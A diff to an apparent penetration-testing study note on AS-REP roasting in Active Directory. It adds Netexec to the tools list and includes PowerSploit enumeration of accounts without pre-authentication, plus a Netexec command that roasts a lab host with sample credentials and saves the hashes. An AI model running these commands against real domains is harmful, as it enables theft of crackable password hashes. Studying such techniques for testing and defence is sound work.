@@ -2,7 +2,7 @@
 ## Summary
 AS-REP
 ## Attack Requirements
-- Target account
+Notes
 ## Enumeration Methods
 ### PowerSploit
 ```
@@ -12,3 +12,10 @@ Get-Domainuser | Where-Object { $_.UserAccountControl -like "*DONT_REQ_PREAUTH"}
 Using Rubeus
 ## Tools
 - Rubeus
+- Netexec
+
+
+### Netexec
+```
+nxc ldap 10.0.2.15 -u fcastle -p Password1 --asreproast nxc-aspreproast-output.log
+```
